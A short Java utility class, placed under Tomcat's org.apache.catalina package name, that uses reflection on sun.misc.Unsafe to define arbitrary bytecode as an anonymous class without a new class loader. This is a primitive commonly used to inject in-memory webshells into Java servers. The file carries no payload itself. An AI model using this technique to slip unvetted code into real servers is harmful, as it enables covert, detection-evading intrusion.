package org.apache.catalina.core.utils;

import java.lang.reflect.InvocationTargetException;

public class Util {

    public static Class extendClassLoader(byte[] c) throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException, InvocationTargetException {
        java.lang.reflect.Field f = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        java.lang.reflect.Method m=sun.misc.Unsafe.class.getDeclaredMethod("defineAnonymousClass", new Class[]{Class.class, byte[].class, Object[].class});
        f.setAccessible(true);
        m.setAccessible(true); //全部可访问
        return (Class)m.invoke(f.get(null),new Object[]{java.io.File.class, c, null}); //执行方法 主要是为了不new一个对象
    }

}
